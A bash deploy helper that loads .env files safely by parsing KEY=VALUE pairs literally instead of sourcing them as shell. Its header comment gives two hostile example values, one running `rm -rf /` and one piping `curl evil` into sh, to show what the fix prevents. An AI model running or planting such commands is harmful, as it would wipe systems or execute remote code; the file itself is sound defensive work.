#!/bin/bash
# deploy/lib/env.sh — safe .env loading for update.sh
#
# update.sh used to load .env with `set -a; source <(grep -v '^\s*#' .env ...)`,
# which *executes every line as bash*. That has two problems:
#
#   1. Correctness — any value containing a shell metacharacter breaks the run.
#      A password like `p@ss(word)` or a Discord status like `online (bot)`
#      makes bash fail with "syntax error near unexpected token `newline'"
#      before a single migration runs.
#   2. Safety — a value like  KEY=`rm -rf /`  or  KEY=$(curl evil|sh)  would be
#      *executed* at deploy time, not stored. .env holds secrets pasted by a
#      human; it must never be run as code.
#
# load_dotenv parses KEY=VALUE pairs literally and exports them without
# evaluating the value, so special characters are preserved verbatim and never
# executed. This matches how docker-compose already reads the same .env file.
#
# Parsing rules (chosen to stay compatible with the previous `source` behaviour
# for ordinary files, while never executing anything):
#   - Leading whitespace is ignored; fully-blank lines are skipped.
#   - Lines whose first non-blank character is `#` are comments and skipped.
#     (Inline `#` is NOT a comment — it stays part of the value, as before.)
#   - An optional leading `export ` is tolerated.
#   - The key is everything before the first `=`; it must be a valid shell
#     identifier ([A-Za-z_][A-Za-z0-9_]*) or the line is skipped.
#   - The value is everything after the first `=`, taken literally, except that
#     one layer of matching surrounding single or double quotes is stripped.
#   - A trailing CR (CRLF files) is tolerated.

# load_dotenv <file>
# Exports every KEY=VALUE pair found in <file>. Returns 1 if the file is missing.
load_dotenv() {
  local file="$1"
  local line key val

  [ -f "$file" ] || return 1

  while IFS= read -r line || [ -n "$line" ]; do
    # Tolerate CRLF line endings.
    line=${line%$'\r'}
    # Strip leading whitespace.
    line=${line#"${line%%[![:space:]]*}"}
    # Skip blank lines and full-line comments.
    case "$line" in
      '' | '#'*) continue ;;
    esac
    # Tolerate a leading `export `.
    line=${line#export }
    # Must contain an `=`, otherwise it isn't an assignment.
    case "$line" in
      *=*) ;;
      *) continue ;;
    esac

    key=${line%%=*}
    val=${line#*=}

    # Strip trailing whitespace from the key (allows "KEY = value" spacing).
    key=${key%"${key##*[![:space:]]}"}

    # Only accept valid shell identifiers; skip anything else.
    case "$key" in
      '' | [!A-Za-z_]* | *[!A-Za-z0-9_]*) continue ;;
    esac

    # Trim surrounding whitespace from the value (so "KEY = value" yields
    # "value"), then strip one layer of matching surrounding quotes. Order
    # matters: trimming happens outside the quotes, so whitespace *inside*
    # quotes — KEY="  spaced  " — is preserved.
    val=${val#"${val%%[![:space:]]*}"}
    val=${val%"${val##*[![:space:]]}"}
    case "$val" in
      '"'*'"') val=${val#\"}; val=${val%\"} ;;
      "'"*"'") val=${val#\'}; val=${val%\'} ;;
    esac

    # Export literally — the value is never evaluated as shell.
    export "$key=$val"
  done <"$file"
}
